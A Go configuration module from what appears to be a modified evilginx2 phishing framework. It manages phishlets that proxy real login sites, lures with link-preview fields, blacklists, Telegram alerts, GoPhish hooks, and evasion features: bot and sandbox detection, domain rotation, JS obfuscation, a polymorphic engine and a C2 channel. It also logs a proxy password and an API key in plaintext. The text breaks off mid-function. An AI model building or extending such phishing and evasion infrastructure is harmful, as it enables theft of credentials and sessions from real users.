package core

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

type Lure struct {
	Id              string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
}

type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
}

type ProxyConfig struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type BlacklistConfig struct {
	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
}

type WhitelistConfig struct {
	Enabled bool `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
}

type TelegramConfig struct {
	BotToken string `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
	ChatID   string `mapstructure:"chat_id" json:"chat_id" yaml:"chat_id"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type DNSProviderConfig struct {
	Provider         string `mapstructure:"provider" json:"provider" yaml:"provider"`
	ApiKey           string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	Email            string `mapstructure:"email" json:"email" yaml:"email"`
	Enabled          bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	WildcardEnabled  bool   `mapstructure:"wildcard_enabled" json:"wildcard_enabled" yaml:"wildcard_enabled"`
}

type BotguardConfig struct {
	Enabled     bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Sensitivity string `mapstructure:"sensitivity" json:"sensitivity" yaml:"sensitivity"`
	SpoofURL    string `mapstructure:"spoof_url" json:"spoof_url" yaml:"spoof_url"`
}

type JSObfuscationConfig struct {
	Enabled bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Level   string `mapstructure:"level" json:"level" yaml:"level"`
}

type MLDetectorConfig struct {
	Enabled         bool    `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Threshold       float64 `mapstructure:"threshold" json:"threshold" yaml:"threshold"`
	CollectBehavior bool    `mapstructure:"collect_behavior" json:"collect_behavior" yaml:"collect_behavior"`
	LogPredictions  bool    `mapstructure:"log_predictions" json:"log_predictions" yaml:"log_predictions"`
}

type CloudflareConfig struct {
	AccountID       string `mapstructure:"account_id" json:"account_id" yaml:"account_id"`
	APIToken        string `mapstructure:"api_token" json:"api_token" yaml:"api_token"`
	ZoneID          string `mapstructure:"zone_id" json:"zone_id" yaml:"zone_id"`
	WorkerSubdomain string `mapstructure:"worker_subdomain" json:"worker_subdomain" yaml:"worker_subdomain"`
	Enabled         bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type LureGenerationConfig struct {
	Strategy string `mapstructure:"strategy" json:"strategy" yaml:"strategy"` // short, medium, long, realistic, hex, base64, mixed
}

type GeneralConfig struct {
	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
}

type Config struct {
	general              *GeneralConfig
	certificates         *CertificatesConfig
	blacklistConfig      *BlacklistConfig
	whitelistConfig      *WhitelistConfig
	gophishConfig        *GoPhishConfig
	telegramConfig       *TelegramConfig
	proxyConfig          *ProxyConfig
	dnsProviderConfig    *DNSProviderConfig
	botguardConfig       *BotguardConfig
	jsObfuscationConfig  *JSObfuscationConfig
	mlDetectorConfig     *MLDetectorConfig
	captchaConfig        *CaptchaConfig
	domainRotationConfig *DomainRotationConfig
	trafficShapingConfig *TrafficShapingConfig
	sandboxDetectionConfig *SandboxDetectionConfig
	c2ChannelConfig *C2Config
	polymorphicConfig *PolymorphicConfig
	cloudflareWorkerConfig *CloudflareConfig
	lureGenerationConfig *LureGenerationConfig
	phishletConfig       map[string]*PhishletConfig
	phishlets          map[string]*Phishlet
	phishletNames      []string
	activeHostnames    []string
	redirectorsDir     string
	lures              []*Lure
	lureIds            []string
	subphishlets       []*SubPhishlet
	cfg                *viper.Viper
}

const (
	CFG_GENERAL       = "general"
	CFG_CERTIFICATES  = "certificates"
	CFG_LURES         = "lures"
	CFG_PROXY         = "proxy"
	CFG_PHISHLETS     = "phishlets"
	CFG_BLACKLIST     = "blacklist"
	CFG_WHITELIST     = "whitelist"
	CFG_SUBPHISHLETS  = "subphishlets"
	CFG_GOPHISH       = "gophish"
	CFG_TELEGRAM      = "telegram"
	CFG_DNS_PROVIDER  = "dns_provider"
	CFG_BOTGUARD      = "botguard"
	CFG_JS_OBFUSCATION = "js_obfuscation"
	CFG_ML_DETECTOR   = "ml_detector"
	CFG_CAPTCHA       = "captcha"
	CFG_DOMAIN_ROTATION = "domain_rotation"
	CFG_TRAFFIC_SHAPING = "traffic_shaping"
	CFG_SANDBOX_DETECTION = "sandbox_detection"
	CFG_C2_CHANNEL = "c2_channel"
	CFG_POLYMORPHIC = "polymorphic_engine"
	CFG_CLOUDFLARE_WORKER = "cloudflare_worker"
	CFG_LURE_GENERATION = "lure_generation"
)

const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:              &GeneralConfig{},
		certificates:         &CertificatesConfig{},
		gophishConfig:        &GoPhishConfig{},
		telegramConfig:       &TelegramConfig{},
		dnsProviderConfig:    &DNSProviderConfig{},
		botguardConfig:       &BotguardConfig{},
		jsObfuscationConfig:  &JSObfuscationConfig{},
		mlDetectorConfig:     &MLDetectorConfig{Enabled: true, Threshold: 0.85, CollectBehavior: true, LogPredictions: true},
		captchaConfig:        &CaptchaConfig{Enabled: false, Provider: "", RequireForLures: false, Providers: make(map[string]ProviderConfig)},
		domainRotationConfig: &DomainRotationConfig{Enabled: false, Strategy: "round-robin", RotationInterval: 60, MaxDomains: 10, AutoGenerate: false},
		trafficShapingConfig: &TrafficShapingConfig{Enabled: false, Mode: "adaptive", GlobalRateLimit: 1000, GlobalBurstSize: 2000, PerIPRateLimit: 60, PerIPBurstSize: 120, CleanupInterval: 30},
		sandboxDetectionConfig: &SandboxDetectionConfig{Enabled: false, Mode: "passive", ServerSideChecks: true, ClientSideChecks: true, CacheResults: true, CacheDuration: 30, DetectionThreshold: 0.6, ActionOnDetection: "block"},
		c2ChannelConfig: &C2Config{Enabled: false, Transport: "https", Servers: make([]C2Server, 0), HeartbeatInterval: 300, RetryInterval: 30, MaxRetries: 3, CertPinning: false, Compression: true, ChunkSize: 4096},
		polymorphicConfig: &PolymorphicConfig{Enabled: false, MutationLevel: "medium", CacheEnabled: true, CacheDuration: 30, SeedRotation: 60, TemplateMode: false, PreserveSemantics: true},
		cloudflareWorkerConfig: &CloudflareConfig{},
		lureGenerationConfig: &LureGenerationConfig{Strategy: "realistic"},
		phishletConfig:       make(map[string]*PhishletConfig),
		phishlets:            make(map[string]*Phishlet),
		phishletNames:        []string{},
		lures:                []*Lure{},
		blacklistConfig:      &BlacklistConfig{},
		whitelistConfig:      &WhitelistConfig{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("json")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.json")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
	if c.cfg.Get("general.autocert") == nil {
		c.cfg.Set("general.autocert", true)
		c.general.Autocert = true
	}

	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)

	c.cfg.UnmarshalKey(CFG_WHITELIST, &c.whitelistConfig)

	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)

	c.cfg.UnmarshalKey(CFG_TELEGRAM, &c.telegramConfig)

	c.cfg.UnmarshalKey(CFG_DNS_PROVIDER, &c.dnsProviderConfig)

	c.cfg.UnmarshalKey(CFG_BOTGUARD, &c.botguardConfig)

	c.cfg.UnmarshalKey(CFG_JS_OBFUSCATION, &c.jsObfuscationConfig)

	c.cfg.UnmarshalKey(CFG_ML_DETECTOR, &c.mlDetectorConfig)

	c.cfg.UnmarshalKey(CFG_CAPTCHA, &c.captchaConfig)

	c.cfg.UnmarshalKey(CFG_DOMAIN_ROTATION, &c.domainRotationConfig)

	c.cfg.UnmarshalKey(CFG_TRAFFIC_SHAPING, &c.trafficShapingConfig)

	c.cfg.UnmarshalKey(CFG_SANDBOX_DETECTION, &c.sandboxDetectionConfig)

	c.cfg.UnmarshalKey(CFG_C2_CHANNEL, &c.c2ChannelConfig)

	c.cfg.UnmarshalKey(CFG_POLYMORPHIC, &c.polymorphicConfig)

	c.cfg.UnmarshalKey(CFG_CLOUDFLARE_WORKER, &c.cloudflareWorkerConfig)

	if c.general.OldIpv4 != "" {
		if c.general.ExternalIpv4 == "" {
			c.SetServerExternalIP(c.general.OldIpv4)
		}
		c.SetServerIP("")
	}

	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
		c.SetBlacklistMode("unauth")
	}

	if c.general.UnauthUrl == "" && created_cfg {
		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
	}
	if c.general.HttpsPort == 0 {
		c.SetHttpsPort(443)
	}
	if c.general.DnsPort == 0 {
		c.SetDnsPort(53)
	}
	if created_cfg {
		c.EnableAutocert(true)
	}

	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.proxyConfig = &ProxyConfig{}
	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)

	for i := 0; i < len(c.lures); i++ {
		c.lureIds = append(c.lureIds, GenRandomToken())
	}

	c.cfg.WriteConfig()
	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	if c.general.Domain == "" {
		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
		return false
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}
	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
		return false
	}
	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	//log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart evilginx for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyConfig.Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyConfig.Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	c.proxyConfig.Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig.Port)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyConfig.Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyConfig.Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramBotToken(token string) {
	c.telegramConfig.BotToken = token
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram bot token set")
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramChatID(chatID string) {
	c.telegramConfig.ChatID = chatID
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram chat id set to: %s", chatID)
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramEnabled(enabled bool) {
	c.telegramConfig.Enabled = enabled
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram notifications enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) GetCloudflareWorkerConfig() CloudflareConfig {
	return *c.cloudflareWorkerConfig
}

func (c *Config) SetCloudflareWorkerAccountID(accountID string) {
	c.cloudflareWorkerConfig.AccountID = accountID
	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
	log.Info("cloudflare worker account id set")
	c.cfg.WriteConfig()
}

func (c *Config) SetCloudflareWorkerAPIToken(apiToken string) {
	c.cloudflareWorkerConfig.APIToken = apiToken
	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
	log.Info("cloudflare worker api token set")
	c.cfg.WriteConfig()
}

func (c *Config) SetCloudflareWorkerZoneID(zoneID string) {
	c.cloudflareWorkerConfig.ZoneID = zoneID
	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
	log.Info("cloudflare worker zone id set to: %s", zoneID)
	c.cfg.WriteConfig()
}

func (c *Config) SetCloudflareWorkerSubdomain(subdomain string) {
	c.cloudflareWorkerConfig.WorkerSubdomain = subdomain
	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
	log.Info("cloudflare worker subdomain set to: %s", subdomain)
	c.cfg.WriteConfig()
}

func (c *Config) SetCloudflareWorkerEnabled(enabled bool) {
	c.cloudflareWorkerConfig.Enabled = enabled
	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
	log.Info("cloudflare worker deployment enabled: %v", enabled)
	c.cfg.WriteConfig()
}

func (c *Config) IsCloudflareWorkerEnabled() bool {
	return c.cloudflareWorkerConfig.Enabled && 
		c.cloudflareWorkerConfig.AccountID != "" && 
		c.cloudflareWorkerConfig.APIToken != ""
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}
	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			if c_site, ok := hosts[phish_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
			} else if c_site, ok := hosts[orig_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
			}
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
	/*
		var sites_enabled []string
		var sites_hidden []string
		for k := range c.siteDomains {
			_, err := c.GetPhishlet(k)
			if err != nil {
				delete(c.siteDomains, k)
			} else {
				if c.IsSiteEnabled(k) {
					sites_enabled = append(sites_enabled, k)
				}
				if c.IsSiteHidden(k) {
					sites_hidden = append(sites_hidden, k)
				}
			}
		}
		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
		c.cfg.WriteConfig()*/
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.lureIds = append(c.lureIds, GenRandomToken())
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			tlureIds = append(tlureIds, c.lureIds[n])
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			pl, err := c.GetPhishlet(site)
			if err == nil {
				if host == l.Hostname || host == pl.GetLandingPhishHost() {
					if l.Path == path {
						return l, nil
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDnsPort() int {
